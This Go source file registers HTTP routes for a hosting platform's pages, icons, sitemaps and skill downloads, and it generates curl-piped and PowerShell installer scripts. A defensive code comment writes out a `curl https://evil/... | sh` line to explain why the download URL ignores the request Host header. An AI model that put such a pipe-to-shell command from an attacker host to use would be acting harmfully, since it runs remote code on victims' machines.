package siteshttp

import (
	"bytes"
	"io/fs"
	"net/http"
	"slices"
	"strings"
	"time"

	"github.com/vsriram/simple-host/host/edition"
	"github.com/vsriram/simple-host/host/httpx"
	"github.com/vsriram/simple-host/host/sites/sitemap"
	"github.com/vsriram/simple-host/host/web"
)

func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler) {
	registerPhotosUI(mux, publicBaseURL, sh)
	mux.HandleFunc("GET /auth.md", sh.serveAuthMarkdown)
	assets := sh.Pages()
	// The docs website is gone: its old addresses point at the API
	// description and llms.txt.
	mux.Handle("GET /docs.html", http.RedirectHandler("/openapi.json", http.StatusMovedPermanently))
	mux.Handle("GET /docs/api/", http.RedirectHandler("/openapi.json", http.StatusMovedPermanently))
	mux.Handle("GET /docs", http.RedirectHandler("/llms.txt", http.StatusMovedPermanently))
	mux.Handle("GET /docs/", http.RedirectHandler("/llms.txt", http.StatusMovedPermanently))
	sub, _ := fs.Sub(assets.TextFS(), "static")
	fileServerFor := sh.staticFileServer
	// The platform's file server never answers a product's own names: those
	// are reachable only where the product mounted ProductFiles.
	handlerOnly := handlerOnlyFS{FS: sub, hidden: assets.Product.Own, rewritten: assets.Rewritten()}
	fileServer := fileServerFor(handlerOnly)
	if len(assets.Product.Own) > 0 {
		own := handlerOnlyFS{FS: sub, rewritten: assets.Rewritten()}
		assets.Product.FileServer = assets.AdminUICSP(sh.OwnerAppOrStatic(assets.ChromeFileServer(own, fileServerFor(own))))
	}

	// Assets that name the host are intercepted ONLY on an instance that needs
	// rewriting. On simple-host.app the file server keeps serving them exactly
	// as before, down to Last-Modified and Content-Type, so production is
	// untouched rather than merely equivalent.
	if assets.Rewritten() {
		for _, name := range web.RewrittenAssets {
			if name == "openapi.yaml" || name == "openapi.json" || sh.Ed.Routes().HostedEvents && name == "install.html" {
				continue
			}
			mux.Handle("GET /"+name, assets.ServeRewrittenAsset(name, web.InstanceHosts, web.SkillsModTime))
		}
	}
	for _, name := range []string{"openapi.yaml", "openapi.json"} {
		mux.Handle("GET /"+name, assets.ServeRewrittenAsset(name, web.InstanceHosts, web.SkillsModTime))
	}
	if sh.Ed.Routes().HostedEvents {
		mux.Handle("GET /install.html", http.RedirectHandler("/get-started", http.StatusFound))
	}
	// Each product's own icon at the same four addresses. A day of caching plus the ?v= on every link means an
	// icon change is picked up by bumping that letter, not renaming.
	for name, file := range iconFiles() {
		mux.Handle("GET /"+name, serveIcon(sub, file))
	}

	mux.HandleFunc("GET /robots.txt", func(w http.ResponseWriter, r *http.Request) {
		serveRobotsTxt(w, r, sh.Ed.Routes().HostedEvents, sh.Ed.Presentation())
	})
	serveSitemap := sitemap.Serve(sh.Handler, &sh.Sitemaps)
	mux.HandleFunc("GET /sitemap.xml", serveSitemap)
	mux.HandleFunc("GET /sitemap-pages.xml", serveSitemap)

	mux.HandleFunc("GET /.well-known/ard.json", web.DiscoveryDocument(assets, sh.Ed.Presentation().ProductAssets, "ard.json", "application/json", publicBaseURL))
	mux.HandleFunc("GET /.well-known/api-catalog", web.DiscoveryDocument(assets, sh.Ed.Presentation().ProductAssets, "api-catalog", `application/linkset+json;profile="https://www.rfc-editor.org/info/rfc9727"`, publicBaseURL))
	if !sh.Ed.Presentation().ProductAssets {
		// A flat zip of the skill folders, for extraction into ~/.claude/skills or ~/.agents/skills.
		mux.HandleFunc("GET /skills.zip", serveZip(assets.BuildSkillsZip, "simple-host-skills.zip"))
		mux.HandleFunc("GET /skills/version", serveSkillsVersion)
	}
	// The landing film's video and poster files (film.go).
	mux.HandleFunc("GET /film/{file}", web.ServeFilm)
	// Per-skill download routes, derived from the bundle rather than hand-listed
	// so a new skill cannot ship without them.
	for _, dir := range assets.BundledSkillDirs() {
		mux.HandleFunc("GET /skills/"+dir+".zip", assets.ServeSkillZip(dir))
		mux.HandleFunc("GET /skills/"+dir+"/SKILL.md", assets.ServeSkillMarkdown(dir))
		// Same shapes as /v1/skills/…: the bare skill path and its references.
		mux.HandleFunc("GET /skills/"+dir, assets.ServeSkillMarkdown(dir))
		mux.HandleFunc("GET /skills/"+dir+"/references/{file}", func(w http.ResponseWriter, r *http.Request) {
			r.SetPathValue("name", dir)
			assets.ServeSkillReference(w, r)
		})
	}
	// The platform's plugin archive and installers. A product answers these
	// three addresses itself, as it does /skills.zip.
	if !sh.Ed.Presentation().ProductAssets {
		// The wrapped plugin layout (.claude-plugin/plugin.json + skills/<name>/SKILL.md), for `claude --plugin-url <url>`.
		mux.HandleFunc("GET /plugin.zip", serveZip(assets.BuildPluginZip, "simple-host-website.zip"))
		mux.HandleFunc("GET /install.sh", serveInstallScript(publicBaseURL, installScript))
		mux.HandleFunc("GET /install.ps1", serveInstallScript(publicBaseURL, installPowerShellScript))
	}
	// Admin dashboard: all signed-up users + their sites. This shell is public —
	// a browser navigation carries no API key, so it cannot be gated server-side.
	// It renders nothing until /v1/admin/users answers, and that IS gated; a
	// non-admin gets the 404 page instead. See admin.html.
	mux.Handle("GET /admin", assets.AdminUICSP(assets.ServeStaticPage("admin.html")))
	// Feature inventory, given a clean URL like /admin because it is linked from the top nav.
	mux.Handle("GET /features", assets.AdminUICSP(assets.ServeStaticPage("features.html")))
	// What Simple Host costs and its real limits, generated from this install's settings; agents looking for a plans page land here.
	mux.Handle("GET /pricing", assets.AdminUICSP(assets.ServeStaticPage("pricing.html")))
	// Marketing pages, one per audience, shared as direct links.
	mux.Handle("GET /enterprise", assets.AdminUICSP(assets.ServeStaticPage("enterprise.html")))
	mux.Handle("GET /enterprise/brief", assets.AdminUICSP(assets.ServeStaticPage("enterprise-brief.html")))
	mux.Handle("GET /enterprise/architecture", assets.AdminUICSP(assets.ServeStaticPage("enterprise-architecture.html")))
	// The setup helper: a small-box .env and install command, or Enterprise's
	// config.env and Secret template, built in the browser from the two
	// settings lists under static/setup/ (docs/advanced/README.md).
	mux.Handle("GET /setup", assets.AdminUICSP(assets.ServeStaticPage("setup-helper.html")))
	mux.Handle("GET /setup/{$}", http.RedirectHandler("/setup", http.StatusMovedPermanently))
	// What Simple Host Enterprise costs to run on each cloud: a calculator
	// that runs in the browser from static/costs/prices.json (costs/calc.js).
	mux.Handle("GET /costs", assets.AdminUICSP(assets.ServeStaticPage("costs.html")))
	// Terms of service and support, linked from plugin directory listings, so
	// each needs a clean, stable URL.
	mux.Handle("GET /terms", assets.AdminUICSP(assets.ServeStaticPage("terms.html")))
	mux.Handle("GET /support", assets.AdminUICSP(assets.ServeStaticPage("support.html")))
	// Report a page: a small form that emails the support address (report.go).
	mux.Handle("GET /report", assets.AdminUICSP(assets.ServeStaticPage("report.html")))
	mux.Handle("POST /report", sh.ReportHandler())
	// One site's analytics in full, linked from the dashboard card and from the
	// showcase Analytics tab. Same public-shell reasoning as /admin: a browser
	// navigation carries no API key, so the page reads it from localStorage and
	// says plainly when it is missing or the site is not the caller's. The site
	// name is a path segment the page reads back off location.pathname, so no
	// server-side templating is involved.
	mux.Handle("GET /analytics/{sitename}", assets.AdminUICSP(assets.ServeStaticPage("analytics.html")))
	registerDashboard(mux, assets, sh.Ed, publicBaseURL)
	// On the base origin, a bare /<handle> that resolves to a real user renders
	// that user's owner app; everything else is the landing page / static files.
	// Unknown POST endpoints are absent, even though static pages use a GET catch-all.
	mux.Handle("POST /", http.NotFoundHandler())
	fallback := assets.AdminUICSP(sh.OwnerAppOrStatic(assets.ChromeFileServer(handlerOnly, fileServer)))
	mux.Handle("GET /", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/sitemap-sites-") && strings.HasSuffix(r.URL.Path, ".xml") {
			serveSitemap(w, r)
			return
		}
		fallback.ServeHTTP(w, r)
	}))
}

func (sh *SiteHandler) staticFileServer(view handlerOnlyFS) http.Handler {
	staticServer := web.HostDiagram(sh.Ed.Routes().HostedEvents, http.FileServerFS(view))
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		name := strings.TrimPrefix(r.URL.Path, "/")
		if name != "" {
			if _, err := fs.Stat(view, name); err != nil {
				if sh.Ed.Routes().HostedEvents {
					sh.RenderNotFound(w, r, r.URL.Path)
				} else {
					// Same baseline-vs-self split as RenderNotFound
					// (showcase.go): the hosted literal must stay
					// byte-identical; a self-hosted install names itself.
					backLabel := "Go to simple-host.app"
					if sh.Pages().HostedOwner() == "" {
						backLabel = "Go to " + sh.SiteDomain
					}
					sh.renderNotFoundPage(w, r, "Page not found", "The page you’re looking for doesn’t exist.", "/", backLabel)
				}
				return
			}
		}
		staticServer.ServeHTTP(w, r)
	})
}

func registerDashboard(mux *http.ServeMux, assets *web.AssetPipeline, ed *edition.Edition, publicBaseURL string) {
	// Signing in has its own address, so the landing page can stay the landing
	// page for everybody. It serves the same shell:
	// with a session it goes straight through to the owner's app, without one it
	// is the sign-in screen. index.html is not in RewrittenAssets, so serving it
	// raw here matches what the file server would hand back at "/".
	if ed.Routes().HostedEvents {
		// The hackathon platform has no sites dashboard: a signed-in person's
		// place is their events (RegisterHackUI's app shell, static/hack/app.html).
		mux.Handle("GET /dashboard", http.RedirectHandler("/events", http.StatusFound))
	} else {
		markdown := web.HomepageMarkdownHandler(assets, publicBaseURL, ed.Presentation().ProductAssets)
		mux.HandleFunc("GET /index.md", markdown)
		mux.HandleFunc("GET /llms.md", markdown)
		mux.Handle("GET /dashboard", assets.AdminUICSP(assets.ServeStaticPage("index.html")))
		// A person's teams: their sites and members (teams.go).
		mux.Handle("GET /teams", assets.AdminUICSP(assets.ServeStaticPage("teams.html")))
		mux.Handle("GET /{$}", assets.AdminUICSP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Add("Vary", "Accept")
			w.Header().Set("Link", web.HomepageLinks)
			q := r.URL.Query()
			if q.Has("token") || q.Has("cn") || q.Has("new") || q.Has("job") {
				w.Header().Set("Cache-Control", "no-store")
				http.Redirect(w, r, "/dashboard?"+r.URL.RawQuery, http.StatusFound)
				return
			}
			if httpx.AcceptsMarkdown(r) {
				markdown(w, r)
				return
			}
			assets.ServeStaticPage("host-story.html").ServeHTTP(w, r)
		})))
	}
}

// iconFiles maps the icon addresses every page links to the physical file served there; a product lists its own in Replace.
func iconFiles() map[string]string {
	return map[string]string{
		"favicon.svg":          "favicon.svg",
		"favicon.ico":          "favicon.ico",
		"favicon-32.png":       "favicon-32.png",
		"apple-touch-icon.png": "apple-touch-icon.png",
	}
}

func serveIcon(fsys fs.FS, file string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		data, err := fs.ReadFile(fsys, file)
		if err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Cache-Control", "public, max-age=86400")
		http.ServeContent(w, r, file, time.Time{}, bytes.NewReader(data))
	})
}

// handlerOnlyPages are hidden from the file server so each is reachable exactly
// one way: /admin is the only route to the admin UI and it carries the CSP,
// analytics.html reads its site name out of the /analytics/{sitename} path and
// has no site to report on if fetched by filename, and notfound.html /
// showcase.html are templates that are meaningless — literal __SH_MESSAGE__,
// unparseable script — until a handler substitutes them.
var handlerOnlyPages = map[string]bool{
	"photos.html":       true,
	"admin.html":        true,
	"connect.html":      true,
	"analytics.html":    true,
	"setup-helper.html": true,
	"costs.html":        true,
	"report.html":       true,
	"notfound.html":     true,
	"showcase.html":     true,
	"host-story.html":   true,
}

type handlerOnlyFS struct {
	fs.FS
	// hidden are a product's own file names (SetProductAssets): the
	// platform's file server does not answer them. Nil in the view the
	// product's file handler (ProductFiles) serves from.
	hidden map[string]string
	// Rewritten is the constructing pipeline's Rewritten(): whether this
	// instance needs assets intercepted and served through a rewriting
	// handler rather than straight off the embedded FS.
	rewritten bool
}

func (f handlerOnlyFS) Open(name string) (fs.File, error) {
	// Hidden only when a handler has actually taken over, so the canonical
	// instance still serves them straight off the embedded FS. The chrome
	// partials are fragments for chrome.go, never pages in their own right,
	// and the landing film's files are served by ServeFilm (film.go).
	if _, own := f.hidden[name]; own {
		return nil, &fs.PathError{Op: "open", Path: name, Err: fs.ErrNotExist}
	}
	if name == "openapi.yaml" || name == "openapi.json" || handlerOnlyPages[name] || name == "partials" || strings.HasPrefix(name, "partials/") || name == "film" || strings.HasPrefix(name, "film/") || (f.rewritten && slices.Contains(web.RewrittenAssets, name)) {
		return nil, &fs.PathError{Op: "open", Path: name, Err: fs.ErrNotExist}
	}
	return f.FS.Open(name)
}

func serveSkillsVersion(w http.ResponseWriter, r *http.Request) {
	version, err := web.PluginVersion()
	if err != nil {
		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_, _ = w.Write([]byte(`{"version":"` + version + `"}`))
}

func serveZip(build func() ([]byte, error), filename string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		data, err := build()
		if err != nil {
			http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
			return
		}
		w.Header().Set("Content-Type", "application/zip")
		w.Header().Set("Content-Disposition", `attachment; filename="`+filename+`"`)
		http.ServeContent(w, r, filename, web.SkillsModTime, bytes.NewReader(data))
	}
}

// The download base URL is the server-configured canonical PublicBaseURL — it
// is deliberately NOT derived from the request Host. The script is piped into
// `sh`, so reflecting an attacker-controlled Host header would let a crafted
// request produce a `curl https://evil/skills.zip | sh` (remote code execution
// on the victim). PublicBaseURL already carries the correct https scheme.
func serveInstallScript(publicBaseURL string, script func(base string) string) http.HandlerFunc {
	base := strings.TrimRight(publicBaseURL, "/")
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.Header().Set("Cache-Control", "no-cache")
		w.Write([]byte(script(base)))
	}
}

func installScript(base string) string {
	return `#!/bin/sh
# Install Simple Host skills into your agent's skills directory.
# Pure HTTPS, no git, no npm.
#
# Usage:
#   curl -fsSL ` + base + `/install.sh | sh
#
# Override the destination (e.g. for Codex CLI / generic agents):
#   curl -fsSL ` + base + `/install.sh | sh -s -- ~/.agents/skills

set -e

DEST="${1:-$HOME/.claude/skills}"
TMP="$(mktemp -d)"
ZIP="$TMP/simple-host-skills.zip"

mkdir -p "$DEST"

echo "Downloading skills bundle..."
curl -fsSL '` + base + `/skills.zip' -o "$ZIP"

echo "Extracting into $DEST"
unzip -oq "$ZIP" -d "$DEST"

rm -rf "$TMP"

echo
echo "Installed:"
ls -1 "$DEST" | sed 's/^/    /'
echo
echo "Restart your agent if it caches the skills directory."
`
}

func installPowerShellScript(base string) string {
	return `# Install Simple Host skills into your agent's skills directory (Windows PowerShell).
# Pure HTTPS, no git, no npm. Works on Windows PowerShell 5.1 and PowerShell 7+.
#
# Usage:
#   irm ` + base + `/install.ps1 | iex
#
# Override the destination (e.g. for Codex CLI / generic agents):
#   $env:SH_SKILLS_DEST = "$HOME\.agents\skills"; irm ` + base + `/install.ps1 | iex

$ErrorActionPreference = 'Stop'

$dest = if ($env:SH_SKILLS_DEST) { $env:SH_SKILLS_DEST } else { Join-Path $HOME '.claude\skills' }
$tmp  = Join-Path ([System.IO.Path]::GetTempPath()) ('simple-host-skills-' + [System.Guid]::NewGuid().ToString('N'))
$zip  = Join-Path $tmp 'simple-host-skills.zip'

New-Item -ItemType Directory -Force -Path $tmp  | Out-Null
New-Item -ItemType Directory -Force -Path $dest | Out-Null

Write-Host 'Downloading skills bundle...'
Invoke-WebRequest -UseBasicParsing -Uri '` + base + `/skills.zip' -OutFile $zip

Write-Host "Extracting into $dest"
Expand-Archive -Path $zip -DestinationPath $dest -Force

Remove-Item -Recurse -Force $tmp

Write-Host ''
Write-Host 'Installed:'
Get-ChildItem -Name -Path $dest | ForEach-Object { "    $_" }
Write-Host ''
Write-Host 'Restart your agent if it caches the skills directory.'
`
}
